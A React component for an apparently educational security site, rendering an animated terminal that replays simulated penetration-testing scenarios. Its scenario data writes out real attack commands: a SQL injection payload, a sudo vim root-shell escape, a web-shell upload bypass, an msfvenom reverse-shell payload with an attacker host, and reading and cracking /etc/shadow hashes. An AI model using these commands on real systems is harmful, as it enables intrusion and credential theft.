'use client';

import { useState, useEffect, useRef, useCallback } from 'react';

interface TerminalLine {
  type: 'command' | 'output' | 'success' | 'error' | 'info' | 'warning';
  text: string;
  delay?: number;
}

const demoScenarios = {
  nmap: {
    title: 'Network Recon',
    icon: '🔍',
    lines: [
      { type: 'command', text: '$ nmap -sV -sC -p- 192.168.1.105', delay: 0 },
      { type: 'info', text: 'Starting Nmap 7.94 ( https://nmap.org )', delay: 800 },
      { type: 'output', text: 'Scanning 192.168.1.105 [65535 ports]', delay: 400 },
      { type: 'output', text: 'Discovered open port 22/tcp on 192.168.1.105', delay: 600 },
      { type: 'output', text: 'Discovered open port 80/tcp on 192.168.1.105', delay: 300 },
      { type: 'output', text: 'Discovered open port 3306/tcp on 192.168.1.105', delay: 400 },
      { type: 'warning', text: 'Discovered open port 8080/tcp on 192.168.1.105', delay: 300 },
      { type: 'output', text: '', delay: 200 },
      { type: 'info', text: 'PORT     STATE SERVICE    VERSION', delay: 400 },
      { type: 'output', text: '22/tcp   open  ssh        OpenSSH 7.9p1', delay: 200 },
      { type: 'output', text: '80/tcp   open  http       Apache httpd 2.4.38', delay: 200 },
      { type: 'warning', text: '3306/tcp open  mysql      MySQL 5.7.26 (unauthorized)', delay: 200 },
      { type: 'error', text: '8080/tcp open  http-proxy VULNERABLE: CVE-2021-44228', delay: 200 },
      { type: 'output', text: '', delay: 300 },
      { type: 'success', text: '[+] Scan complete. 4 open ports found.', delay: 400 },
      { type: 'error', text: '[!] CRITICAL: Log4j vulnerability detected on port 8080', delay: 300 },
      { type: 'warning', text: '[!] MySQL exposed without authentication', delay: 300 },
    ] as TerminalLine[]
  },
  sqlinjection: {
    title: 'SQL Injection',
    icon: '💉',
    lines: [
      { type: 'command', text: "$ sqlmap -u 'http://target.com/login?id=1' --dbs", delay: 0 },
      { type: 'info', text: '[*] Starting SQLMap v1.7.2', delay: 600 },
      { type: 'output', text: '[*] Testing connection to target URL...', delay: 400 },
      { type: 'success', text: '[+] Connection established', delay: 300 },
      { type: 'output', text: '', delay: 200 },
      { type: 'info', text: "[*] Testing 'id' parameter for SQL injection", delay: 500 },
      { type: 'output', text: "[*] Testing: AND boolean-based blind", delay: 400 },
      { type: 'output', text: "[*] Testing: OR boolean-based blind", delay: 300 },
      { type: 'success', text: "[+] Parameter 'id' is vulnerable!", delay: 400 },
      { type: 'output', text: '', delay: 200 },
      { type: 'warning', text: 'Type: boolean-based blind', delay: 200 },
      { type: 'warning', text: "Payload: id=1' AND 1=1-- -", delay: 200 },
      { type: 'output', text: '', delay: 300 },
      { type: 'info', text: '[*] Enumerating databases...', delay: 500 },
      { type: 'success', text: '[+] Available databases:', delay: 400 },
      { type: 'output', text: '    [*] information_schema', delay: 150 },
      { type: 'output', text: '    [*] mysql', delay: 150 },
      { type: 'error', text: '    [*] users_db  <-- TARGET', delay: 150 },
      { type: 'error', text: '    [*] admin_credentials', delay: 150 },
      { type: 'output', text: '', delay: 300 },
      { type: 'success', text: '[+] 4 databases found. Vulnerability confirmed: CVSS 9.8', delay: 400 },
    ] as TerminalLine[]
  },
  privesc: {
    title: 'Privilege Escalation',
    icon: '⬆️',
    lines: [
      { type: 'command', text: '$ whoami', delay: 0 },
      { type: 'output', text: 'www-data', delay: 300 },
      { type: 'command', text: '$ sudo -l', delay: 500 },
      { type: 'output', text: 'User www-data may run the following:', delay: 400 },
      { type: 'warning', text: '    (root) NOPASSWD: /usr/bin/vim', delay: 300 },
      { type: 'output', text: '', delay: 200 },
      { type: 'info', text: '[*] Checking GTFOBins for vim exploit...', delay: 600 },
      { type: 'success', text: '[+] Exploit found: vim can spawn root shell', delay: 400 },
      { type: 'output', text: '', delay: 300 },
      { type: 'command', text: '$ sudo vim -c \':!/bin/bash\'', delay: 500 },
      { type: 'info', text: '[*] Spawning root shell...', delay: 600 },
      { type: 'output', text: '', delay: 300 },
      { type: 'command', text: '# whoami', delay: 400 },
      { type: 'error', text: 'root', delay: 300 },
      { type: 'command', text: '# id', delay: 400 },
      { type: 'error', text: 'uid=0(root) gid=0(root) groups=0(root)', delay: 300 },
      { type: 'output', text: '', delay: 200 },
      { type: 'success', text: '[+] PRIVILEGE ESCALATION SUCCESSFUL', delay: 400 },
      { type: 'success', text: '[+] Root access obtained via sudo misconfiguration', delay: 300 },
    ] as TerminalLine[]
  },
  webshell: {
    title: 'Web Shell Upload',
    icon: '🐚',
    lines: [
      { type: 'command', text: '$ curl -X POST -F "file=@shell.php" http://target.com/upload', delay: 0 },
      { type: 'info', text: '[*] Attempting file upload bypass...', delay: 600 },
      { type: 'output', text: '[*] Testing extension: .php -> BLOCKED', delay: 400 },
      { type: 'output', text: '[*] Testing extension: .php5 -> BLOCKED', delay: 300 },
      { type: 'warning', text: '[*] Testing extension: .phtml -> ALLOWED', delay: 300 },
      { type: 'output', text: '', delay: 200 },
      { type: 'command', text: '$ mv shell.php shell.phtml', delay: 400 },
      { type: 'command', text: '$ curl -X POST -F "file=@shell.phtml" http://target.com/upload', delay: 500 },
      { type: 'success', text: '[+] File uploaded successfully!', delay: 400 },
      { type: 'output', text: '[+] Location: /uploads/shell.phtml', delay: 300 },
      { type: 'output', text: '', delay: 200 },
      { type: 'command', text: '$ curl http://target.com/uploads/shell.phtml?cmd=id', delay: 500 },
      { type: 'error', text: 'uid=33(www-data) gid=33(www-data)', delay: 400 },
      { type: 'output', text: '', delay: 200 },
      { type: 'info', text: '[*] Establishing reverse shell...', delay: 500 },
      { type: 'command', text: '$ nc -lvnp 4444', delay: 400 },
      { type: 'output', text: 'Listening on 0.0.0.0:4444', delay: 300 },
      { type: 'success', text: '[+] Connection received from 192.168.1.105:52431', delay: 600 },
      { type: 'success', text: '[+] Web shell access achieved!', delay: 300 },
    ] as TerminalLine[]
  },
  passwordcrack: {
    title: 'Password Cracking',
    icon: '🔓',
    lines: [
      { type: 'command', text: '$ cat /etc/shadow | grep admin', delay: 0 },
      { type: 'output', text: 'admin:$6$rounds=5000$salt$hash...', delay: 400 },
      { type: 'output', text: '', delay: 200 },
      { type: 'command', text: '$ echo "admin:$6$rounds..." > hash.txt', delay: 400 },
      { type: 'command', text: '$ hashcat -m 1800 hash.txt rockyou.txt', delay: 500 },
      { type: 'info', text: '[*] Starting Hashcat v6.2.6', delay: 500 },
      { type: 'output', text: '[*] Hash type: sha512crypt $6$', delay: 300 },
      { type: 'output', text: '[*] Wordlist: rockyou.txt (14,344,391 words)', delay: 300 },
      { type: 'output', text: '', delay: 200 },
      { type: 'info', text: '[*] Progress: 0%...', delay: 400 },
      { type: 'output', text: '[*] Progress: 25%...', delay: 500 },
      { type: 'output', text: '[*] Progress: 47%...', delay: 500 },
      { type: 'warning', text: '[*] Progress: 62%... Possible match found!', delay: 400 },
      { type: 'output', text: '', delay: 300 },
      { type: 'success', text: '[+] PASSWORD CRACKED!', delay: 400 },
      { type: 'error', text: '[+] admin:Summer2024!', delay: 300 },
      { type: 'output', text: '', delay: 200 },
      { type: 'info', text: 'Time elapsed: 00:04:23', delay: 300 },
      { type: 'warning', text: '[!] Weak password detected - Common pattern used', delay: 300 },
    ] as TerminalLine[]
  },
  bufferoverflow: {
    title: 'Buffer Overflow',
    icon: '💾',
    lines: [
      { type: 'command', text: '$ gdb ./vulnerable_app', delay: 0 },
      { type: 'info', text: 'GNU gdb (GDB) 12.1', delay: 400 },
      { type: 'output', text: 'Reading symbols from ./vulnerable_app...', delay: 300 },
      { type: 'output', text: '', delay: 200 },
      { type: 'command', text: '(gdb) run $(python3 -c "print(\'A\'*100)")', delay: 500 },
      { type: 'output', text: 'Starting program...', delay: 400 },
      { type: 'error', text: 'Program received signal SIGSEGV, Segmentation fault.', delay: 500 },
      { type: 'error', text: '0x41414141 in ?? ()', delay: 300 },
      { type: 'output', text: '', delay: 200 },
      { type: 'success', text: '[+] EIP overwritten with 0x41414141 (AAAA)', delay: 400 },
      { type: 'info', text: '[*] Finding offset...', delay: 500 },
      { type: 'command', text: '$ msf-pattern_offset -q 0x41414141', delay: 400 },
      { type: 'success', text: '[+] Exact offset: 76 bytes', delay: 400 },
      { type: 'output', text: '', delay: 200 },
      { type: 'info', text: '[*] Generating shellcode...', delay: 500 },
      { type: 'command', text: '$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 -f py', delay: 400 },
      { type: 'output', text: '[*] Payload size: 68 bytes', delay: 400 },
      { type: 'output', text: '', delay: 200 },
      { type: 'command', text: '$ python3 exploit.py', delay: 500 },
      { type: 'info', text: '[*] Sending payload: [NOP sled][Shellcode][RET addr]', delay: 500 },
      { type: 'success', text: '[+] Exploit successful! Shell spawned.', delay: 400 },
    ] as TerminalLine[]
  },
  fullattack: {
    title: 'Full Attack Chain',
    icon: '⚔️',
    lines: [
      { type: 'info', text: '══════════════════════════════════════════════════════════', delay: 0 },
      { type: 'info', text: '  PENETRATION TEST SIMULATION - AUTHORIZED ACCESS ONLY', delay: 100 },
      { type: 'info', text: '══════════════════════════════════════════════════════════', delay: 100 },
      { type: 'output', text: '', delay: 300 },
      { type: 'info', text: '[PHASE 1] Reconnaissance', delay: 400 },
      { type: 'command', text: '$ nmap -sV 10.10.10.50', delay: 300 },
      { type: 'output', text: 'PORT   STATE SERVICE VERSION', delay: 400 },
      { type: 'output', text: '22/tcp open  ssh     OpenSSH 7.2p2', delay: 200 },
      { type: 'warning', text: '80/tcp open  http    Apache 2.4.18 (Ubuntu)', delay: 200 },
      { type: 'success', text: '[+] Web server detected', delay: 300 },
      { type: 'output', text: '', delay: 300 },
      { type: 'info', text: '[PHASE 2] Vulnerability Scanning', delay: 400 },
      { type: 'command', text: '$ nikto -h http://10.10.10.50', delay: 300 },
      { type: 'warning', text: '[!] /admin/ - Admin panel found', delay: 400 },
      { type: 'error', text: '[!] /config.php.bak - Backup file exposed!', delay: 400 },
      { type: 'success', text: '[+] Credentials found in backup', delay: 300 },
      { type: 'output', text: '', delay: 300 },
      { type: 'info', text: '[PHASE 3] Exploitation', delay: 400 },
      { type: 'command', text: '$ python3 exploit.py --target 10.10.10.50', delay: 300 },
      { type: 'output', text: '[*] Sending payload...', delay: 500 },
      { type: 'output', text: '[*] Establishing reverse shell...', delay: 600 },
      { type: 'success', text: '[+] Shell obtained as www-data', delay: 400 },
      { type: 'output', text: '', delay: 300 },
      { type: 'info', text: '[PHASE 4] Privilege Escalation', delay: 400 },
      { type: 'command', text: '$ ./linpeas.sh', delay: 300 },
      { type: 'error', text: '[!] SUID binary found: /usr/bin/pkexec', delay: 500 },
      { type: 'command', text: '$ ./CVE-2021-4034.sh', delay: 400 },
      { type: 'success', text: '[+] Exploiting PwnKit vulnerability...', delay: 600 },
      { type: 'output', text: '', delay: 200 },
      { type: 'error', text: '# whoami', delay: 300 },
      { type: 'error', text: 'root', delay: 200 },
      { type: 'output', text: '', delay: 300 },
      { type: 'success', text: '══════════════════════════════════════════════════════════', delay: 200 },
      { type: 'success', text: '  [+] PENETRATION TEST COMPLETE - ROOT ACCESS ACHIEVED', delay: 200 },
      { type: 'success', text: '══════════════════════════════════════════════════════════', delay: 200 },
    ] as TerminalLine[]
  }
};

type ScenarioKey = keyof typeof demoScenarios;

export default function LiveTerminalDemo() {
  const [selectedScenario, setSelectedScenario] = useState<ScenarioKey>('fullattack');
  const [displayedLines, setDisplayedLines] = useState<TerminalLine[]>([]);
  const [isRunning, setIsRunning] = useState(false);
  const [currentLineIndex, setCurrentLineIndex] = useState(0);
  const [typingText, setTypingText] = useState('');
  const [isTyping, setIsTyping] = useState(false);
  const [speed, setSpeed] = useState(1); // 0.5x, 1x, 2x
  const [soundEnabled, setSoundEnabled] = useState(false);
  const [copiedCommand, setCopiedCommand] = useState<string | null>(null);
  const terminalRef = useRef<HTMLDivElement>(null);
  const audioContextRef = useRef<AudioContext | null>(null);

  const scenario = demoScenarios[selectedScenario];

  // Initialize audio context
  const initAudio = useCallback(() => {
    if (!audioContextRef.current && typeof window !== 'undefined') {
      audioContextRef.current = new (window.AudioContext || (window as typeof window & { webkitAudioContext: typeof AudioContext }).webkitAudioContext)();
    }
    return audioContextRef.current;
  }, []);

  // Play typing sound
  const playTypingSound = useCallback(() => {
    if (!soundEnabled) return;
    const ctx = initAudio();
    if (!ctx) return;

    const oscillator = ctx.createOscillator();
    const gainNode = ctx.createGain();

    oscillator.connect(gainNode);
    gainNode.connect(ctx.destination);

    oscillator.frequency.value = 800 + Math.random() * 200;
    oscillator.type = 'square';
    gainNode.gain.value = 0.02;

    oscillator.start();
    oscillator.stop(ctx.currentTime + 0.02);
  }, [soundEnabled, initAudio]);

  // Play success/error sound
  const playNotificationSound = useCallback((type: 'success' | 'error' | 'warning') => {
    if (!soundEnabled) return;
    const ctx = initAudio();
    if (!ctx) return;

    const oscillator = ctx.createOscillator();
    const gainNode = ctx.createGain();

    oscillator.connect(gainNode);
    gainNode.connect(ctx.destination);

    const frequencies = {
      success: [523, 659, 784],
      error: [200, 150],
      warning: [440, 350]
    };

    const freqs = frequencies[type];
    oscillator.frequency.value = freqs[0];
    oscillator.type = 'sine';
    gainNode.gain.value = 0.05;

    oscillator.start();

    freqs.forEach((freq, i) => {
      if (i > 0) {
        oscillator.frequency.setValueAtTime(freq, ctx.currentTime + i * 0.1);
      }
    });

    oscillator.stop(ctx.currentTime + freqs.length * 0.1);
  }, [soundEnabled, initAudio]);

  const runDemo = () => {
    setDisplayedLines([]);
    setCurrentLineIndex(0);
    setTypingText('');
    setIsRunning(true);
  };

  const resetDemo = () => {
    setDisplayedLines([]);
    setCurrentLineIndex(0);
    setTypingText('');
    setIsTyping(false);
    setIsRunning(false);
  };

  // Typing effect for commands
  useEffect(() => {
    if (!isRunning || currentLineIndex >= scenario.lines.length) {
      if (currentLineIndex >= scenario.lines.length) {
        setIsRunning(false);
      }
      return;
    }

    const line = scenario.lines[currentLineIndex];
    const baseDelay = line.delay ?? 300;
    const adjustedDelay = baseDelay / speed;

    if (line.type === 'command' && line.text.length > 0) {
      // Typing effect for commands
      setIsTyping(true);
      let charIndex = 0;
      setTypingText('');

      const typingInterval = setInterval(() => {
        if (charIndex < line.text.length) {
          setTypingText(line.text.slice(0, charIndex + 1));
          playTypingSound();
          charIndex++;
        } else {
          clearInterval(typingInterval);
          setIsTyping(false);
          setTypingText('');
          setDisplayedLines(prev => [...prev, line]);
          setCurrentLineIndex(prev => prev + 1);
        }
      }, 30 / speed);

      return () => clearInterval(typingInterval);
    } else {
      // Regular output - no typing
      const timeout = setTimeout(() => {
        setDisplayedLines(prev => [...prev, line]);
        setCurrentLineIndex(prev => prev + 1);

        // Play sound for special line types
        if (line.type === 'success') playNotificationSound('success');
        if (line.type === 'error') playNotificationSound('error');
        if (line.type === 'warning') playNotificationSound('warning');
      }, adjustedDelay);

      return () => clearTimeout(timeout);
    }
  }, [isRunning, currentLineIndex, scenario.lines, speed, playTypingSound, playNotificationSound]);

  // Auto-scroll to bottom
  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [displayedLines, typingText]);

  const getLineColor = (type: TerminalLine['type']) => {
    switch (type) {
      case 'command': return 'var(--accent-cyan)';
      case 'success': return 'var(--accent-green)';
      case 'error': return '#ff6b6b';
      case 'warning': return '#ffd93d';
      case 'info': return 'var(--accent-purple)';
      default: return 'var(--text-secondary)';
    }
  };

  const copyCommand = (text: string) => {
    const command = text.replace(/^\$\s*|^#\s*/, '');
    navigator.clipboard.writeText(command);
    setCopiedCommand(command);
    setTimeout(() => setCopiedCommand(null), 2000);
  };

  return (
    <section id="terminal-demo" className="relative z-10 px-[5%]" style={{ padding: '96px 0' }}>
      <div className="w-full flex flex-col items-center">
        {/* Section Header */}
        <div className="text-center" style={{ marginBottom: '48px' }}>
          <p className="font-mono text-[var(--accent-cyan)]" style={{ marginBottom: '8px' }}>
            {'>'} ./live_demo.sh
          </p>
          <h2 className="text-4xl md:text-5xl font-bold" style={{ marginBottom: '16px' }}>
            Live <span className="text-[var(--accent-cyan)]">Terminal</span> Demo
          </h2>
          <p className="text-[var(--text-secondary)] max-w-2xl mx-auto" style={{ textAlign: 'center' }}>
            Watch real security techniques in action. Select a scenario and see how penetration testing works.
          </p>
        </div>

        {/* Scenario Selector */}
        <div className="flex flex-wrap justify-center w-full max-w-5xl" style={{ gap: '8px', marginBottom: '24px' }}>
          {(Object.keys(demoScenarios) as ScenarioKey[]).map((key) => (
            <button
              key={key}
              onClick={() => {
                setSelectedScenario(key);
                resetDemo();
              }}
              className={`font-mono text-xs md:text-sm rounded transition-all flex items-center ${
                selectedScenario === key
                  ? 'bg-[var(--accent-cyan)] text-[var(--bg-primary)]'
                  : 'border border-[var(--border-color)] text-[var(--text-secondary)] hover:border-[var(--accent-cyan)] hover:text-[var(--accent-cyan)]'
              }`}
              style={{ padding: '6px 12px', gap: '6px' }}
            >
              <span>{demoScenarios[key].icon}</span>
              <span className="hidden sm:inline">{demoScenarios[key].title}</span>
              <span className="sm:hidden">{demoScenarios[key].title.split(' ')[0]}</span>
            </button>
          ))}
        </div>

        {/* Controls Bar */}
        <div className="flex flex-wrap justify-center items-center w-full max-w-4xl" style={{ gap: '16px', marginBottom: '16px' }}>
          {/* Speed Control */}
          <div className="flex items-center" style={{ gap: '8px' }}>
            <span className="font-mono text-xs text-[var(--text-muted)]">Speed:</span>
            <div className="flex" style={{ gap: '4px' }}>
              {[0.5, 1, 2].map((s) => (
                <button
                  key={s}
                  onClick={() => setSpeed(s)}
                  className={`font-mono text-xs rounded transition-all ${
                    speed === s
                      ? 'bg-[var(--accent-green)] text-[var(--bg-primary)]'
                      : 'border border-[var(--border-color)] text-[var(--text-muted)] hover:border-[var(--accent-green)]'
                  }`}
                  style={{ padding: '4px 8px' }}
                >
                  {s}x
                </button>
              ))}
            </div>
          </div>

          {/* Sound Toggle */}
          <button
            onClick={() => {
              setSoundEnabled(!soundEnabled);
              if (!soundEnabled) initAudio();
            }}
            className={`font-mono text-xs rounded transition-all flex items-center ${
              soundEnabled
                ? 'bg-[var(--accent-purple)] text-[var(--bg-primary)]'
                : 'border border-[var(--border-color)] text-[var(--text-muted)] hover:border-[var(--accent-purple)]'
            }`}
            style={{ padding: '4px 12px', gap: '6px' }}
          >
            {soundEnabled ? '🔊' : '🔇'} Sound
          </button>
        </div>

        {/* Terminal Window */}
        <div className="w-full max-w-4xl">
          <div className="bg-[var(--bg-secondary)] border border-[var(--border-color)] rounded-lg overflow-hidden" style={{ boxShadow: '0 20px 60px rgba(0,0,0,0.5), 0 0 30px rgba(0, 255, 255, 0.1)' }}>
            {/* Terminal Header */}
            <div className="bg-[var(--bg-tertiary)] flex items-center justify-between border-b border-[var(--border-color)]" style={{ padding: '12px 16px' }}>
              <div className="flex items-center" style={{ gap: '8px' }}>
                <div className="w-3 h-3 rounded-full bg-[#ff5f56]"></div>
                <div className="w-3 h-3 rounded-full bg-[#ffbd2e]"></div>
                <div className="w-3 h-3 rounded-full bg-[#27ca40]"></div>
              </div>
              <span className="font-mono text-xs text-[var(--text-muted)]">
                kali@security:~/{scenario.title.toLowerCase().replace(/\s+/g, '-')}
              </span>
              <div style={{ width: '52px' }}></div>
            </div>

            {/* Terminal Body */}
            <div
              ref={terminalRef}
              className="font-mono text-sm overflow-y-auto"
              style={{ height: '400px', padding: '16px', backgroundColor: '#0d0d0d' }}
            >
              {displayedLines.length === 0 && !isRunning && (
                <div className="text-[var(--text-muted)] flex items-center justify-center h-full">
                  <div className="text-center">
                    <p style={{ marginBottom: '8px' }}>Click "Run Demo" to start the simulation</p>
                    <p className="text-xs">This is a simulated demo for educational purposes</p>
                  </div>
                </div>
              )}
              {displayedLines.map((line, idx) => (
                <div
                  key={idx}
                  className="group flex items-start"
                  style={{
                    color: getLineColor(line.type),
                    marginBottom: '4px',
                    fontFamily: 'monospace',
                  }}
                >
                  <span className="flex-grow">{line.text || '\u00A0'}</span>
                  {line.type === 'command' && line.text && (
                    <button
                      onClick={() => copyCommand(line.text)}
                      className="opacity-0 group-hover:opacity-100 transition-opacity text-[var(--text-muted)] hover:text-[var(--accent-cyan)]"
                      style={{ marginLeft: '8px', fontSize: '10px' }}
                      title="Copy command"
                    >
                      {copiedCommand === line.text.replace(/^\$\s*|^#\s*/, '') ? '✓' : '📋'}
                    </button>
                  )}
                </div>
              ))}
              {isTyping && (
                <div style={{ color: 'var(--accent-cyan)', fontFamily: 'monospace' }}>
                  {typingText}
                  <span
                    className="inline-block w-2 h-4 bg-[var(--accent-cyan)] ml-1"
                    style={{ animation: 'blink 0.5s step-end infinite', verticalAlign: 'middle' }}
                  />
                </div>
              )}
              {isRunning && !isTyping && (
                <span
                  className="inline-block w-2 h-4 bg-[var(--accent-cyan)]"
                  style={{ animation: 'blink 1s step-end infinite' }}
                />
              )}
            </div>

            {/* Terminal Footer */}
            <div className="bg-[var(--bg-tertiary)] flex items-center justify-between border-t border-[var(--border-color)]" style={{ padding: '12px 16px' }}>
              <div className="flex items-center" style={{ gap: '8px' }}>
                <span className="font-mono text-xs text-[var(--text-muted)]">
                  {isRunning ? 'Running...' : displayedLines.length > 0 ? 'Complete' : 'Ready'}
                </span>
                {isRunning && (
                  <div className="w-2 h-2 rounded-full bg-[var(--accent-green)]" style={{ animation: 'pulse 1s infinite' }} />
                )}
              </div>
              <div className="flex" style={{ gap: '8px' }}>
                <button
                  onClick={resetDemo}
                  className="font-mono text-xs border border-[var(--border-color)] text-[var(--text-secondary)] rounded hover:border-[var(--accent-red)] hover:text-[var(--accent-red)] transition-all"
                  style={{ padding: '6px 12px' }}
                >
                  Reset
                </button>
                <button
                  onClick={runDemo}
                  disabled={isRunning}
                  className={`font-mono text-xs rounded transition-all ${
                    isRunning
                      ? 'bg-[var(--bg-tertiary)] text-[var(--text-muted)] cursor-not-allowed'
                      : 'bg-[var(--accent-cyan)] text-[var(--bg-primary)] hover:bg-[var(--accent-green)]'
                  }`}
                  style={{ padding: '6px 16px' }}
                >
                  {isRunning ? 'Running...' : 'Run Demo'}
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Copied Toast */}
        {copiedCommand && (
          <div
            className="fixed bottom-8 left-1/2 -translate-x-1/2 bg-[var(--accent-green)] text-[var(--bg-primary)] font-mono text-sm rounded shadow-lg"
            style={{ padding: '12px 24px', zIndex: 100 }}
          >
            Command copied!
          </div>
        )}

        {/* Disclaimer */}
        <p className="font-mono text-xs text-[var(--text-muted)] max-w-2xl" style={{ marginTop: '24px', textAlign: 'center' }}>
          * This is a simulated demonstration for educational purposes only.
          All techniques shown are performed in authorized environments.
        </p>
      </div>
    </section>
  );
}
